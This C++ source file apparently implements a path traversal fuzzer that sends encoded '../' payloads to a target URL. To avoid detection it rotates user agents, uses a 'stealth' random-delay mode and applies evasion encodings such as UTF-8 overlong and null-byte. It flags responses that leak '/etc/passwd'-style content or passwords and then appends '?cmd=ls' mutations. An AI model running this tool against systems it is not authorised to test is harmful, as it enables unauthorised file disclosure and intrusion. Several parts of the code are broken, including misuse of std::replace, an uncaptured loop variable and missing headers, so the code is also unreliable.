#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <regex>
#include <chrono>
#include <random>
#include <curl/curl.h>
#include <cxxopts.hpp> // External library for argument parsing
#include <spdlog/spdlog.h> // External library for logging
#include "progressbar.hpp" // External library for progress bar (or use a simple alternative)

#include <unistd.h> // For sleep functions (cross-platform alternative needed for Windows)

// Define a simple callback for libcurl to store response data
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append(static_cast<char*>(contents), total_size);
    return total_size;
}

class BrayTraversalAutomator {
public:
    BrayTraversalAutomator(const std::string& base_url, const std::string& payload_file = "payloads.txt",
                           const std::string& user_agent_file = "user_agents.txt", int traversal_depth = 10,
                           bool os_detection = true, int threads = 10, std::vector<std::string> success_criteria = {},
                           std::vector<std::string> encoding_methods = {"url", "double_url", "unicode", "utf8_overlong",
                                                                        "null_byte", "hex", "rot13", "globbing",
                                                                        "path_truncation", "octal", "base64"},
                           bool stealth = false, bool verbose = false, const std::string& output_file = "",
                           const std::string& request_type = "GET")
        : base_url_(base_url), payload_file_(payload_file), user_agent_file_(user_agent_file),
          traversal_depth_(traversal_depth), os_detection_(os_detection), threads_(threads),
          stealth_(stealth), verbose_(verbose), output_file_(output_file), request_type_(request_type) {
        // Initialize success criteria if not provided
        if (success_criteria.empty()) {
            success_criteria_ = {"root:", "Administrator", "NT AUTHORITY\\SYSTEM", "uid=", "gid=", "password"};
        } else {
            success_criteria_ = success_criteria;
        }
        encoding_methods_ = encoding_methods;

        // Set up logging
        if (verbose_) {
            spdlog::set_level(spdlog::level::debug);
        } else {
            spdlog::set_level(spdlog::level::info);
        }
        logger_ = spdlog::stdout_color_mt("console");
        file_logger_ = spdlog::basic_logger_mt("file_logger", "bray_traversal.log");
    }

    ~BrayTraversalAutomator() {
        curl_global_cleanup(); // Clean up libcurl
    }

    void execute() {
        // Initialize libcurl
        curl_global_init(CURL_GLOBAL_ALL);

        // Parse and detect OS/server if enabled
        if (os_detection_) {
            detect_os_and_server();
        }

        // Load payloads and user agents
        load_payloads_from_file();
        load_user_agents();

        // AI Enhancement: Prioritize payloads based on detected OS and server
        prioritize_payloads();

        // Fuzz payloads with multithreading and async HTTP
        fuzz_payloads();

        // Save results if output file is specified
        if (!output_file_.empty()) {
            save_results(output_file_);
        }

        spdlog::info("Scan completed.");
    }

private:
    std::string base_url_;
    std::string payload_file_;
    std::string user_agent_file_;
    int traversal_depth_;
    std::string os_type_;
    std::string server_type_;
    std::vector<std::string> payloads_;
    std::vector<std::string> user_agents_;
    bool os_detection_;
    int threads_;
    std::vector<std::string> success_criteria_;
    std::vector<std::string> encoding_methods_;
    bool stealth_;
    bool verbose_;
    std::string output_file_;
    std::string request_type_;
    std::mutex mutex_; // For thread-safe access to shared data
    std::map<std::string, int> response_codes_; // Store payload and response code
    std::shared_ptr<spdlog::logger> logger_;
    std::shared_ptr<spdlog::logger> file_logger_;

    // Detect OS and server type using a simple HTTP GET request
    void detect_os_and_server() {
        CURL* curl = curl_easy_init();
        if (!curl) {
            spdlog::error("Failed to initialize curl for OS detection.");
            return;
        }

        std::string response_data;
        curl_easy_setopt(curl, CURLOPT_URL, base_url_.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            spdlog::error("Error detecting OS and server: {}", curl_easy_strerror(res));
        } else {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            std::string server_header;
            curl_easy_getinfo(curl, CURLINFO_PRIMARY_IP, &server_header); // Get server header if available

            // Simple OS detection based on response and headers
            if (response_data.find("windows") != std::string::npos || server_header.find("win32") != std::string::npos) {
                os_type_ = "windows";
            } else if (server_header.find("unix") != std::string::npos || server_header.find("linux") != std::string::npos) {
                os_type_ = "unix";
            } else {
                os_type_ = "unknown";
            }

            // Server type detection
            if (server_header.find("apache") != std::string::npos) {
                server_type_ = "Apache";
            } else if (server_header.find("nginx") != std::string::npos) {
                server_type_ = "Nginx";
            } else if (server_header.find("iis") != std::string::npos) {
                server_type_ = "IIS";
            } else {
                server_type_ = "Unknown";
            }

            spdlog::info("Detected OS: {}, Server: {}", os_type_, server_type_);
        }

        curl_easy_cleanup(curl);
    }

    // Encode payload using specified method
    std::string encode_payload(const std::string& payload, const std::string& encoding_type) {
        if (encoding_type == "url") {
            // URL encode
            std::string encoded;
            for (auto c : payload) {
                if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                    encoded += c;
                } else {
                    char buf[4];
                    sprintf(buf, "%%%02X", (unsigned char)c);
                    encoded += buf;
                }
            }
            return encoded;
        } else if (encoding_type == "double_url") {
            return encode_payload(encode_payload(payload, "url"), "url");
        } else if (encoding_type == "unicode") {
            std::string encoded = payload;
            std::replace(encoded.begin(), encoded.end(), '/', '%c0%af');
            std::replace(encoded.begin(), encoded.end(), '.', '%c0%ae');
            return encoded;
        } else if (encoding_type == "utf8_overlong") {
            std::string encoded = payload;
            std::replace(encoded.begin(), encoded.end(), '/', "%e0%80%af");
            std::replace(encoded.begin(), encoded.end(), '.', "%e0%80%ae");
            return encoded;
        } else if (encoding_type == "null_byte") {
            return payload + "%00";
        } else if (encoding_type == "hex") {
            std::string encoded;
            for (auto c : payload) {
                char buf[3];
                sprintf(buf, "%02x", (unsigned char)c);
                encoded += buf;
            }
            return encoded;
        } else if (encoding_type == "rot13") {
            std::string encoded;
            for (auto c : payload) {
                if (isupper(c)) {
                    encoded += 'A' + (c - 'A' + 13) % 26;
                } else if (islower(c)) {
                    encoded += 'a' + (c - 'a' + 13) % 26;
                } else {
                    encoded += c;
                }
            }
            return encoded;
        } else if (encoding_type == "globbing") {
            std::string encoded = payload;
            std::replace(encoded.begin(), encoded.end(), '/', "/*/");
            return encoded;
        } else if (encoding_type == "path_truncation") {
            std::string encoded = payload;
            std::replace(encoded.begin(), encoded.end(), "/etc/passwd", "/etc/./passwd");
            return encoded;
        } else if (encoding_type == "octal") {
            std::string encoded;
            for (auto c : payload) {
                char buf[5];
                sprintf(buf, "\\%03o", (unsigned char)c);
                encoded += buf;
            }
            return encoded;
        } else if (encoding_type == "base64") {
            // Simple base64 encoding (you can use a library for robustness)
            const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string encoded;
            int val = 0, valb = -6;
            for (auto c : payload) {
                val = (val << 8) + c;
                valb += 8;
                while (valb >= 0) {
                    encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
                    valb -= 6;
                }
            }
            if (valb > -6) encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
            while (encoded.size() % 4) encoded += '=';
            return encoded;
        }
        return payload; // Default to no encoding if type is invalid
    }

    // Load payloads from file
    void load_payloads_from_file() {
        std::ifstream file(payload_file_);
        if (!file.is_open()) {
            spdlog::error("Payload file not found: {}", payload_file_);
            return;
        }
        std::string line;
        while (std::getline(file, line)) {
            payloads_.push_back(line);
        }
        file.close();
        spdlog::info("Loaded {} payloads from file", payloads_.size());
    }

    // Load user agents from file
    void load_user_agents() {
        std::ifstream file(user_agent_file_);
        if (!file.is_open()) {
            spdlog::error("User agent file not found: {}", user_agent_file_);
            return;
        }
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) {
                user_agents_.push_back(line);
            }
        }
        file.close();
        spdlog::info("Loaded {} user agents from file", user_agents_.size());
    }

    // AI Enhancement: Prioritize payloads based on OS and server type
    void prioritize_payloads() {
        if (os_type_ == "windows") {
            // Higher score for Windows-specific payloads (e.g., containing "..\\")
            for (auto& payload : payloads_) {
                int score = 0;
                if (payload.find("..\\") != std::string::npos) score += 10;
                if (payload.find("C:\\") != std::string::npos) score += 5;
                // Add payload with score (sort later)
                // For simplicity, sort the vector in place
            }
        } else if (os_type_ == "unix") {
            // Higher score for Unix-specific payloads (e.g., containing "../")
            for (auto& payload : payloads_) {
                int score = 0;
                if (payload.find("../") != std::string::npos) score += 10;
                if (payload.find("/etc/") != std::string::npos) score += 5;
                // Sort based on score
            }
        }
        // Simple sort based on heuristic (you can add a score vector if needed)
        std::sort(payloads_.begin(), payloads_.end(), [this](const std::string& a, const std::string& b) {
            // Example scoring: count "../" or "..\\" occurrences
            size_t count_a = std::count(a.begin(), a.end(), '.');
            size_t count_b = std::count(b.begin(), b.end(), '.');
            return count_a > count_b; // Higher dot count first (simple heuristic)
        });
        spdlog::info("Payloads prioritized based on detected OS: {}", os_type_);
    }

    // Fuzz a single payload (thread-safe)
    void fuzz_single_payload(const std::string& payload, progressbar::ProgressBar& bar) {
        std::string target_url = base_url_ + "/" + payload;
        CURL* curl = curl_easy_init();
        if (!curl) {
            spdlog::error("CURL init failed for payload: {}", payload);
            return;
        }

        std::string response_data;
        curl_easy_setopt(curl, CURLOPT_URL, target_url.c_str());
        if (!user_agents_.empty()) {
            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents_[rand() % user_agents_.size()].c_str());
        }
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);

        // Set request type
        if (request_type_ == "POST") {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
        } else {
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }

        auto start_time = std::chrono::high_resolution_clock::now();
        CURLcode res = curl_easy_perform(curl);
        auto end_time = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> response_time = end_time - start_time;

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

        // Store response code
        {
            std::lock_guard<std::mutex> lock(mutex_);
            response_codes_[payload] = static_cast<int>(http_code);
        }

        if (http_code == 200) {
            spdlog::info("Fuzzed {} - Response: {} (Success), Time: {:.4f} seconds", payload, http_code, response_time.count());
            analyze_response(response_data, payload);
        } else {
            spdlog::info("Fuzzed {} - Response: {} (Failed), Time: {:.4f} seconds", payload, http_code, response_time.count());
        }

        curl_easy_cleanup(curl);

        // Update progress bar
        bar += 1;

        // Stealth mode: Add random delay
        if (stealth_) {
            std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 500 + 100)); // Random delay between 100-600ms
        }
    }

    // Analyze response for success criteria and adapt if needed
    void analyze_response(const std::string& response, const std::string& payload) {
        for (const auto& criterion : success_criteria_) {
            std::regex regex_pattern(criterion, std::regex_constants::icase);
            if (std::regex_search(response, regex_pattern)) {
                spdlog::info("Valid payload found: {}", payload);
                adapt_payload(payload);
                break; // No need to check further criteria
            }
        }
    }

    // Adapt and mutate payload (AI-like enhancement)
    void adapt_payload(const std::string& payload) {
        std::vector<std::string> mutated_payloads;
        for (int i = 0; i < 3; ++i) { // Generate 3 mutations
            std::string mutation = payload + "?cmd=ls&random=" + std::to_string(rand() % 9000 + 1000);
            // Apply random encoding for mutation
            std::string encoding_type = encoding_methods_[rand() % encoding_methods_.size()];
            mutation = encode_payload(mutation, encoding_type);
            mutated_payloads.push_back(mutation);
        }

        // Add mutated payloads to the set (thread-safe)
        {
            std::lock_guard<std::mutex> lock(mutex_);
            payloads_.insert(payloads_.end(), mutated_payloads.begin(), mutated_payloads.end());
        }
        spdlog::info("Adapted and mutated payload: {}", payload);
    }

    // Fuzz all payloads with multithreading
    void fuzz_payloads() {
        progressbar::ProgressBar bar(payloads_.size(), "Fuzzing payloads");
        std::vector<std::thread> threads;

        // Launch threads
        for (int i = 0; i < threads_; ++i) {
            threads.emplace_back([this, &bar]() {
                size_t start_idx = 0, end_idx = payloads_.size();
                size_t chunk_size = payloads_.size() / threads_;
                size_t my_start = i * chunk_size;
                size_t my_end = (i == threads_ - 1) ? payloads_.size() : (i + 1) * chunk_size;

                for (size_t j = my_start; j < my_end; ++j) {
                    fuzz_single_payload(payloads_[j], bar);
                }
            });
        }

        // Join all threads
        for (auto& th : threads) {
            th.join();
        }
    }

    // Save results to file
    void save_results(const std::string& file) {
        std::ofstream outfile(file);
        if (!outfile.is_open()) {
            spdlog::error("Failed to open output file: {}", file);
            return;
        }
        for (const auto& pair : response_codes_) {
            outfile << "Payload: " << pair.first << ", Status Code: " << pair.second << std::endl;
        }
        outfile.close();
        spdlog::info("Results saved to {}", file);
    }
};

int main(int argc, char* argv[]) {
    cxxopts::Options options("Bray Traversal Automator", "A tool for testing path traversal vulnerabilities");
    options.add_options()
        ("u,url", "Target URL to test", cxxopts::value<std::string>())
        ("T,threads", "Number of threads", cxxopts::value<int>()->default_value("10"))
        ("p,payloads", "File containing payloads to test", cxxopts::value<std::string>()->default_value("payloads.txt"))
        ("a,user-agents", "File containing user agents to use", cxxopts::value<std::string>()->default_value("user_agents.txt"))
        ("d,depth", "Traversal depth for recursive testing", cxxopts::value<int>()->default_value("10"))
        ("sc,success-criteria", "Success criteria for valid payloads (space-separated)", cxxopts::value<std::vector<std::string>>())
        ("e,encoding", "Encoding methods to apply (space-separated)", cxxopts::value<std::vector<std::string>>()->default_value({"url", "double_url", "unicode", "utf8_overlong", "null_byte", "hex", "rot13", "globbing", "path_truncation", "octal", "base64"}))
        ("s,stealth", "Enable stealth mode", cxxopts::value<bool>()->default_value("false"))
        ("v,verbose", "Enable verbose logging", cxxopts::value<bool>()->default_value("false"))
        ("o,output", "Output file to save results", cxxopts::value<std::string>())
        ("r,request-type", "HTTP request type (GET or POST)", cxxopts::value<std::string>()->default_value("GET"));

    auto result = options.parse(argc, argv);

    if (!result.count("url")) {
        std::cerr << "Error: --url is required." << std::endl;
        return 1;
    }

    std::string base_url = result["url"].as<std::string>();
    int threads = result["threads"].as<int>();
    std::string payload_file = result["payloads"].as<std::string>();
    std::string user_agent_file = result["user-agents"].as<std::string>();
    int traversal_depth = result["depth"].as<int>(); // Now utilized for recursive payload generation if needed
    bool stealth = result["stealth"].as<bool>();
    bool verbose = result["verbose"].as<bool>();
    std::string output_file = result.count("output") ? result["output"].as<std::string>() : "";
    std::string request_type = result["request-type"].as<std::string>();
    auto success_criteria = result.count("success-criteria") ? result["success-criteria"].as<std::vector<std::string>>() : std::vector<std::string>{};
    auto encoding_methods = result.count("encoding") ? result["encoding"].as<std::vector<std::string>>() : result["encoding"].as<std::vector<std::string>>(); // Default handled in class

    // Initialize and execute the automator
    BrayTraversalAutomator automator(base_url, payload_file, user_agent_file, traversal_depth, true, threads, success_criteria, encoding_methods, stealth, verbose, output_file, request_type);
    automator.execute();

    return 0;
}
